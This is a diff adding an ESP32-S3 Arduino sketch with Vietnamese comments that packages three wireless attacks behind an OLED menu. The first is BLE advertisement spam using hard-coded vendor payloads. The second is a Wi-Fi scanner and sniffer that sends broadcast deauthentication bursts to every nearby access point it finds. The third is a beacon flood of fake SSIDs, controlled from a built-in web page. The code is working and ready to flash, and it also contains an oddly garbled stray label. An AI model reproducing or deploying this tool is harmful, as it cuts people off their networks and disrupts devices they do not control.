@@ -1,0 +1,600 @@
+#include <Wire.h>
+#include <Adafruit_GFX.h>
+#include <Adafruit_SSD1306.h>
+#include <NimBLEDevice.h>
+#include <WiFi.h>
+#include <WebServer.h>
+#include "esp_wifi.h"
+
+// --- CẤU HÌNH MÀN HÌNH OLED ---
+#define SCREEN_WIDTH 128
+#define SCREEN_HEIGHT 64
+#define OLED_RESET    -1
+Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
+#define I2C_SDA 8
+#define I2C_SCL 9
+
+// --- CẤU HÌNH 3 NÚT BẤM (Trái, Phải, Chọn) ---
+#define BTN_LEFT   4
+#define BTN_RIGHT  5
+#define BTN_SELECT 6
+
+// --- MENU & TRẠNG THÁI CHUNG ---
+// menuIndex: 0 = Bluetooth Spam, 1 = WiFi Sniffer/Deauth, 2 = WiFi Web Beacon Spoofer
+#define TOTAL_MENUS 3 
+volatile int menuIndex = 0;       
+volatile bool isRunning = false;  
+
+unsigned long lastLeftTime = 0;
+unsigned long lastRightTime = 0;
+unsigned long lastSelectTime = 0;
+
+// --- PHẦN 1: PAYLOAD BLUETOOTH SPAM ---
+uint8_t payload1[] = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12 };
+uint8_t payload2[] = { 0x1b, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x03, 0x01, 0x25, 0x00, 0x5e, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00 };
+NimBLEAdvertising* pAdvertising = nullptr;
+
+// --- PHẦN 2: CẤU HÌNH WI-FI SNIFFER & DEAUTH ---
+#define MAX_TARGETS 10         
+#define MAX_CLIENTS_PER_TARGET 4 
+#define BURST_COUNT 4          
+#define PACKET_DELAY 250       
+
+struct Target {
+  uint8_t bssid[6];
+  int channel;
+  char ssid[33];
+  int rssi;
+  uint8_t clients[MAX_CLIENTS_PER_TARGET][6];
+  int clientCount;
+};
+
+Target targets[MAX_TARGETS];
+volatile int targetCount = 0;
+volatile bool isScanningAsync = false; 
+
+struct AnalyzedPacket {
+  uint8_t type;         
+  uint8_t subtype;      
+  uint8_t addr1[6];     
+  uint8_t addr2[6];     
+  uint8_t addr3[6];     
+  int rssi;             
+};
+
+#define RING_BUFFER_SIZE 64 
+AnalyzedPacket packetBuffer[RING_BUFFER_SIZE];
+volatile int bufHead = 0;
+volatile int bufTail = 0;
+portMUX_TYPE bufferMux = portMUX_INITIALIZER_UNLOCKED;
+portMUX_TYPE targetMux = portMUX_INITIALIZER_UNLOCKED;
+
+uint8_t deauthBroadcastPacket[26] = { 
+  0xC0, 0x00, 
+  0x3A, 0x01, 
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+  0x70, 0x01,                         
+  0x07, 0x00                          
+};
+
+// --- PHẦN 3: CẤU HÌNH WIFI WEB BEACON SPOOFER ---
+WebServer server(80);
+char baseSSID[20] = "Hiiiii"; 
+volatile int totalNetworks = 30; 
+volatile bool beaconRunning = false; // Trạng thái phát beacon riêng cho chế độ 3
+#define WIFI_CHANNEL 6
+#define LED_PIN 2 
+TaskHandle_t BeaconTaskHandle = NULL;
+
+const char* htmlPage = R"rawliteral(
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>ESP32 WiFi Spoofer Control</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #f4f4f9; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; height: 100vh; }
+    .card { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
+    h2 { color: #333; margin-bottom: 20px; }
+    label { font-weight: bold; color: #555; display: block; margin-top: 15px; text-align: left; }
+    input[type="text"], input[type="number"] { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
+    .btn { background: #28a745; color: white; border: none; padding: 12px; width: 100%; border-radius: 6px; font-size: 16px; cursor: pointer; margin-top: 20px; transition: background 0.2s; text-decoration: none; display: inline-block; box-sizing: border-box;}
+    .btn:hover { background: #218838; }
+    .btn-stop { background: #dc3545; }
+    .btn-stop:hover { background: #bd2130; }
+    .status { font-weight: bold; margin-bottom: 15px; padding: 8px; border-radius: 5px; }
+    .running { background: #d4edda; color: #155724; }
+    .stopped { background: #f8d7da; color: #721c24; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>WiFi Spoofer Control</h2>
+    <div class="status %STATUS_CLASS%">Trạng thái: %STATUS_TEXT%</div>
+    
+    <form action="/save" method="POST">
+      <label for="ssid">Tên SSID gốc:</label>
+      <input type="text" id="ssid" name="ssid" value="%SSID%" maxlength="20" required>
+      
+      <label for="total">Số lượng mạng (1 - 50):</label>
+      <input type="number" id="total" name="total" value="%TOTAL%" min="1" max="50" required>
+      
+      <input type="submit" value="Lưu Cấu Hình" class="btn">
+    </form>
+
+    <a href="%TOGGLE_ACTION%" class="btn %TOGGLE_CLASS%">%TOGGLE_TEXT%</a>
+  </div>
+</body>
+</html>
+)rawliteral";
+
+void handleRoot() {
+  String s = htmlPage;
+  s.replace("%SSID%", String(baseSSID));
+  s.replace("%TOTAL%", String(totalNetworks));
+  
+  if (beaconRunning) {
+    s.replace("%STATUS_CLASS%", "running");
+    s.replace("%STATUS_TEXT%", "ĐANG PHÁT SÓNG");
+    s.replace("%TOGGLE_ACTION%", "/toggle");
+    s.replace("%TOGGLE_CLASS%", "btn-stop");
+    s.replace("%TOGGLE_TEXT%", "Dừng Phát (STOP)");
+  } else {
+    s.replace("%STATUS_CLASS%", "stopped");
+    s.replace("%STATUS_TEXT%", "ĐÃ DỪNG");
+    s.replace("%TOGGLE_ACTION%", "/toggle");
+    s.replace("%TOGGLE_CLASS%", ""); 
+    s.replace("%TOGGLE_TEXT%", "Bắt Đầu Phát (START)");
+  }
+  server.send(200, "text/html", s);
+}
+
+void handleSave() {
+  if (server.hasArg("ssid")) {
+    String newSSID = server.arg("ssid");
+    newSSID.trim();
+    if (newSSID.length() > 0 && newSSID.length() < 21) {
+      strcpy(baseSSID, newSSID.c_str());
+    }
+  }
+  if (server.hasArg("total")) {
+    int newTotal = server.arg("total").toInt();
+    if (newTotal >= 1 && newTotal <= 50) {
+      totalNetworks = newTotal;
+    }
+  }
+  server.sendHeader("Location", "/", true);
+  server.send(302, "text/plain", "");
+}
+
+void handleToggle() {
+  beaconRunning = !beaconRunning;
+  server.sendHeader("Location", "/", true);
+  server.send(302, "text/plain", "");
+}
+
+void beaconTask(void * pvParameters) {
+  while (true) {
+    if (!beaconRunning || menuIndex != 2) {
+      digitalWrite(LED_PIN, LOW);
+      vTaskDelay(200 / portTICK_PERIOD_MS);
+      continue;
+    }
+
+    int currentTotal = totalNetworks;
+    char currentBase[20];
+    strcpy(currentBase, baseSSID);
+
+    digitalWrite(LED_PIN, HIGH);
+
+    for (int round = 0; round < 2; round++) {
+      for (int i = 0; i < currentTotal; i++) {
+        if (!beaconRunning || menuIndex != 2) break;
+
+        String currentSSID = String(currentBase) + " " + String(i + 1);
+        int ssidLen = currentSSID.length();
+        if (ssidLen > 32) ssidLen = 32;
+
+        uint8_t beaconPacket[128] = {
+          0x80, 0x00, 0x00, 0x00,                       
+          0xff, 0xff, 0xff, 0xff, 0xff, 0xff,           
+          0x02, 0x55, 0x66, 0x77, (uint8_t)(i + 1), 0x01, 
+          0x02, 0x55, 0x66, 0x77, (uint8_t)(i + 1), 0x01, 
+          0x00, 0x00,                                   
+          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+          0x64, 0x00,                                   
+          0x31, 0x04                                    
+        };
+
+        int basePacketSize = 36;
+        beaconPacket[36] = 0x00; 
+        beaconPacket[37] = ssidLen; 
+        
+        for (int j = 0; j < ssidLen; j++) {
+          beaconPacket[38 + j] = currentSSID[j];
+        }
+        int currentPacketSize = basePacketSize + 2 + ssidLen;
+
+        uint8_t tagExtras[] = {
+          0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24, 
+          0x03, 0x01, (uint8_t)WIFI_CHANNEL                           
+        };
+
+        for (size_t k = 0; k < sizeof(tagExtras); k++) {
+          beaconPacket[currentPacketSize++] = tagExtras[k];
+        }
+
+        esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, currentPacketSize, false);
+        delayMicroseconds(500); 
+      }
+    }
+
+    digitalWrite(LED_PIN, LOW); 
+    vTaskDelay(50 / portTICK_PERIOD_MS); 
+  }
+}
+
+// --- HÀM KIỂM TRA MAC ---
+bool isValidMac(const uint8_t *mac) {
+    if (mac[0] == 0xFF && mac[1] == 0xFF && mac[2] == 0xFF && mac[3] == 0xFF && mac[4] == 0xFF && mac[5] == 0xFF) return false;
+    if (mac[0] == 0x00 && mac[1] == 0x00 && mac[2] == 0x00 && mac[3] == 0x00 && mac[4] == 0x00 && mac[5] == 0x00) return false;
+    if (mac[0] & 0x01) return false; 
+    return true;
+}
+
+void IRAM_ATTR promiscuous_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
+    if (!isRunning || menuIndex != 1 || buf == nullptr) return;
+    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
+    uint16_t packetLen = pkt->rx_ctrl.sig_len;
+    if (packetLen < 24) return;
+
+    uint8_t *payload = pkt->payload;
+    AnalyzedPacket tempPkt;
+    tempPkt.type = (payload[0] >> 2) & 0x03;       
+    tempPkt.subtype = (payload[0] >> 4) & 0x0F;    
+    tempPkt.rssi = pkt->rx_ctrl.rssi;
+    
+    memset(tempPkt.addr1, 0, 6);
+    memset(tempPkt.addr2, 0, 6);
+    memset(tempPkt.addr3, 0, 6);
+
+    memcpy(tempPkt.addr1, &payload[4], 6);
+    memcpy(tempPkt.addr2, &payload[10], 6);
+    memcpy(tempPkt.addr3, &payload[16], 6);
+
+    portENTER_CRITICAL_ISR(&bufferMux);
+    int nextHead = (bufHead + 1) % RING_BUFFER_SIZE;
+    if (nextHead != bufTail) {
+        packetBuffer[bufHead] = tempPkt;
+        bufHead = nextHead;
+    }
+    portEXIT_CRITICAL_ISR(&bufferMux);
+}
+
+void startAsyncScan() {
+  if (!isRunning || menuIndex != 1) return;
+  int scanStatus = WiFi.scanComplete();
+  if (scanStatus == WIFI_SCAN_RUNNING) return;
+  if (scanStatus >= 0) WiFi.scanDelete(); 
+
+  esp_wifi_set_promiscuous(false);
+  WiFi.scanNetworks(true, true, false, 150); 
+  isScanningAsync = true;
+}
+
+void initBluetoothMode() {
+  esp_wifi_set_promiscuous(false);
+  WiFi.mode(WIFI_OFF); 
+  delay(100);
+  NimBLEDevice::init("");
+  NimBLEDevice::setPower(ESP_PWR_LVL_P9);
+  pAdvertising = NimBLEDevice::getAdvertising();
+  Serial.println("[+] Khởi chạy: BLUETOOTH SPAM");
+}
+
+void initWiFiToolMode() {
+  NimBLEDevice::deinit(true); 
+  delay(100);
+  WiFi.mode(WIFI_MODE_STA);
+  WiFi.disconnect(false);
+  delay(100);
+  
+  portENTER_CRITICAL(&bufferMux);
+  bufHead = 0;
+  bufTail = 0;
+  portEXIT_CRITICAL(&bufferMux);
+
+  if (esp_wifi_set_promiscuous(true) == ESP_OK) {
+      esp_wifi_set_promiscuous_rx_cb(&promiscuous_rx_cb);
+  }
+  startAsyncScan();
+  Serial.println("[+] Khởi chạy: WIFI TOOL (Sniffer & Deauth)");
+}
+
+void initWiFiWebBeaconMode() {
+  NimBLEDevice::deinit(true);
+  delay(100);
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP("Config_ESP32", "12345678");
+  esp_wifi_set_channel(WIFI_CHANNEL, WIFI_SECOND_CHAN_NONE);
+  
+  server.on("/", HTTP_GET, handleRoot);
+  server.on("/save", HTTP_POST, handleSave);
+  server.on("/toggle", HTTP_GET, handleToggle);
+  server.begin();
+  Serial.println("[+] Khởi chạy: WIFI WEB BEACON SPOOFER");
+}
+
+// --- GIAO DIỆN OLED ---
+void drawUI(int selected, bool running, int tCount) {
+  display.clearDisplay();
+
+  display.fillRect(0, 0, 128, 12, SSD1306_WHITE);
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_BLACK);
+  display.setCursor(8, 2);
+  display.print(F(" ESP32-S3 TOOLBOX "));
+
+  display.setTextColor(SSD1306_WHITE);
+
+  if (!running) {
+    display.setCursor(0, 14);
+    display.print(F("CHON CHE DO:"));
+    
+    display.setCursor(0, 24);
+    if (selected == 0) display.print(F("> 1. BT Spam"));
+    else               display.print(F("  1. BT Spam"));
+
+    display.setCursor(0, 34);
+    if (selected == 1) display.print(F("> 2. WiFi Tool"));
+    else               display.print(F("  2. WiFi Tool"));
+
+    display.setCursor(0, 44);
+    if (selected == 2) display.print(F("> 3. Web Beacon"));
+    else               display.print(F("  3. Web Beacon"));
+  } 
+  else {
+    display.setCursor(0, 16);
+    if (selected == 0) {
+      display.print(F("RUN: BLUETOOTH SPAM"));
+      display.setCursor(0, 30);
+      display.print(F("Status: Broadcasting"));
+    } else if (selected == 1) {
+      display.print(F("RUN: WIFI TOOL"));
+      display.setCursor(0, 30);
+      display.printf("Targets found: %d", tCount);
+    } else {
+      display.print(F("RUN: WEB BEACON"));
+      display.setCursor(0, 26);
+      display.print(F("IP: 192.168.4.1"));
+      display.setCursor(0, 38);
+      display.printf("State: %s", beaconRunning ? "ACTIVE" : "PAUSED");
+    }
+  }
+
+  display.drawFastHLine(0, 54, 128, SSD1306_WHITE);
+  display.setCursor(2, 55);
+  if (!running) {
+    display.print(F("< L/R: Doi | OK: Chay >"));
+  } else {
+    display.print(F("< OK: Dung lai >"));
+  }
+
+  display.display();
+}
+
+void setup() {
+  Serial.begin(115200);
+  pinMode(BTN_LEFT, INPUT_PULLUP);
+  pinMode(BTN_RIGHT, INPUT_PULLUP);
+  pinMode(BTN_SELECT, INPUT_PULLUP);
+  pinMode(LED_PIN, OUTPUT);
+  digitalWrite(LED_PIN, LOW);
+
+  Wire.begin(I2C_SDA, I2C_SCL);
+  Wire.setClock(400000); 
+  
+  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
+    Serial.println(F("Không tìm thấy màn hình OLED!"));
+  }
+
+  // Khởi tạo FreeRTOS Task cho Beacon Spoofer chạy ngầm
+  xTaskCreatePinnedToCore(
+    beaconTask,          
+    "BeaconTask",        
+    4096,                
+    NULL,                
+    1,                   
+    &BeaconTaskHandle,   
+    0                    
+  );
+}
+
+void loop() {
+  unsigned long currentMillis = millis();
+
+  // Xử lý nút Lên/Trái (Chuyển menu)
+  if (digitalRead(BTN_LEFT) == LOW) {
+    if (!isRunning && (currentMillis - lastLeftTime > 250)) {
+      menuIndex = (menuIndex - 1 + TOTAL_MENUS) % TOTAL_MENUS; 
+      lastLeftTime = currentMillis;
+    }
+  }
+
+  // Xử lý nút Phải (Chuyển menu)
+  if (digitalRead(BTN_RIGHT) == LOW) {
+    if (!isRunning && (currentMillis - lastRightTime > 250)) {
+      menuIndex = (menuIndex + 1) % TOTAL_MENUS; 
+      lastRightTime = currentMillis;
+    }
+  }
+
+  // Xử lý nút Chọn (OK / Start / Stop)
+  if (digitalRead(BTN_SELECT) == LOW) {
+    if (currentMillis - lastSelectTime > 400) {
+      isRunning = !isRunning; 
+      if (isRunning) {
+        if (menuIndex == 0) initBluetoothMode();
+        else if (menuIndex == 1) initWiFiToolMode();
+        else if (menuIndex == 2) initWiFiWebBeaconMode();
+      } else {
+        // Dọn dẹp toàn bộ tài nguyên khi dừng chế độ hiện tại
+        esp_wifi_set_promiscuous(false);
+        WiFi.scanDelete();
+        WiFi.mode(WIFI_OFF);
+        NimBLEDevice::deinit(true);
+        pAdvertising = nullptr; 
+        targetCount = 0;
+        isScanningAsync = false;
+        beaconRunning = false;
+        server.stop();
+        Serial.println("[-] Đã dừng hoạt động, về màn hình chính.");
+      }
+      lastSelectTime = currentMillis;
+    }
+  }
+
+  // Nếu đang ở chế độ Web Beacon, cần xử lý client truy cập Web liên tục ngay cả khi isRunning = true
+  if (isRunning && menuIndex == 2) {
+    server.handleClient();
+    drawUI(2, true, 0);
+    delay(5);
+    return;
+  }
+
+  if (!isRunning) {
+    drawUI(menuIndex, false, 0);
+    delay(50);
+    return;
+  }
+
+  // Mode 0: Bluetooth Spam
+  if (menuIndex == 0) {
+    if (pAdvertising != nullptr && isRunning) {
+      NimBLEAdvertisementData adv1;
+      adv1.setManufacturerData(std::string((char*)payload1, sizeof(payload1)));
+      pAdvertising->setAdvertisementData(adv1);
+      pAdvertising->start();
+      delay(30);
+      pAdvertising->stop();
+
+      if (!isRunning) return; 
+
+      NimBLEAdvertisementData adv2;
+      adv2.setManufacturerData(std::string((char*)payload2, sizeof(payload2)));
+      pAdvertising->setAdvertisementData(adv2);
+      pAdvertising->start();
+      delay(30);
+      pAdvertising->stop();
+    }
+    drawUI(0, true, 0);
+  } 
+  // Mode 1: WiFi Sniffer & Deauth Tool
+  else if (menuIndex == 1) {
+    int processLimit = 15; 
+    while (processLimit > 0 && isRunning) {
+      portENTER_CRITICAL(&bufferMux);
+      if (bufTail == bufHead) {
+        portEXIT_CRITICAL(&bufferMux);
+        break;
+      }
+      AnalyzedPacket p = packetBuffer[bufTail];
+      bufTail = (bufTail + 1) % RING_BUFFER_SIZE;
+      portEXIT_CRITICAL(&bufferMux);
+      
+      portENTER_CRITICAL(&targetMux);
+      if (targetCount > 0) {
+          for (int i = 0; i < targetCount; i++) {
+              if (memcmp(p.addr3, targets[i].bssid, 6) == 0 || memcmp(p.addr1, targets[i].bssid, 6) == 0) {
+                  const uint8_t *potentialClient = nullptr;
+                  if (memcmp(p.addr1, targets[i].bssid, 6) != 0 && isValidMac(p.addr1)) {
+                      potentialClient = p.addr1;
+                  } else if (memcmp(p.addr2, targets[i].bssid, 6) != 0 && isValidMac(p.addr2)) {
+                      potentialClient = p.addr2;
+                  }
+
+                  if (potentialClient != nullptr) {
+                      bool exists = false;
+                      for (int c = 0; c < targets[i].clientCount; c++) {
+                        if (memcmp(targets[i].clients[c], potentialClient, 6) == 0) {
+                            exists = true;
+                            break;
+                        }
+                      }
+                      if (!exists && targets[i].clientCount < MAX_CLIENTS_PER_TARGET) {
+                          memcpy(targets[i].clients[targets[i].clientCount], potentialClient, 6);
+                          targets[i].clientCount++;
+                      }
+                  }
+              }
+          }
+      }
+      portEXIT_CRITICAL(&targetMux);
+      processLimit--;
+    }
+
+    int scanStatus = WiFi.scanComplete();
+    if (scanStatus >= 0 && isRunning) {
+      int foundCount = (scanStatus > 0) ? scanStatus : 0;
+      
+      portENTER_CRITICAL(&targetMux);
+      memset(targets, 0, sizeof(targets));
+      targetCount = (foundCount < MAX_TARGETS) ? foundCount : MAX_TARGETS;
+      
+      if (targetCount > 0) {
+        for (int i = 0; i < targetCount; i++) {
+          targets[i].channel = WiFi.channel(i);
+          memcpy(targets[i].bssid, WiFi.BSSID(i), 6);
+          String ssidStr = WiFi.SSID(i);
+          if (ssidStr.length() == 0) ssidStr = "<Hidden>";
+          ssidStr.toCharArray(targets[i].ssid, 33);
+          targets[i].clientCount = 0;
+        }
+      }
+      portEXIT_CRITICAL(&targetMux);
+
+      WiFi.scanDelete();
+      if (isRunning) {
+        esp_wifi_set_promiscuous(true);
+        esp_wifi_set_promiscuous_rx_cb(&promiscuous_rx_cb);
+      }
+      isScanningAsync = false;
+    }
+
+    if (!isScanningAsync && targetCount == 0 && isRunning) {
+      startAsyncScan();
+    }
+
+    portENTER_CRITICAL(&targetMux);
+    int currentTargets = targetCount;
+    Target localTargets[MAX_TARGETS];
+    if (currentTargets > 0) {
+      memcpy(localTargets, targets, sizeof(Target) * currentTargets);
+    }
+    portEXIT_CRIDENTIAL_EXIT:
+    portEXIT_CRITICAL(&targetMux);
+
+    if (currentTargets > 0 && !isScanningAsync) {
+      for (int t = 0; t < currentTargets; t++) {
+        if (!isRunning || menuIndex != 1) break;
+        esp_wifi_set_channel(localTargets[t].channel, WIFI_SECOND_CHAN_NONE);
+        
+        memcpy(&deauthBroadcastPacket[10], localTargets[t].bssid, 6); 
+        memcpy(&deauthBroadcastPacket[16], localTargets[t].bssid, 6); 
+        
+        for (int i = 0; i < BURST_COUNT; i++) {
+          if (!isRunning) break; 
+          esp_wifi_80211_tx(WIFI_IF_STA, deauthBroadcastPacket, sizeof(deauthBroadcastPacket), false);
+          delayMicroseconds(PACKET_DELAY);
+        }
+      }
+    }
+
+    drawUI(1, true, currentTargets);
+    yield();
+    delay(20);
+  }
+}
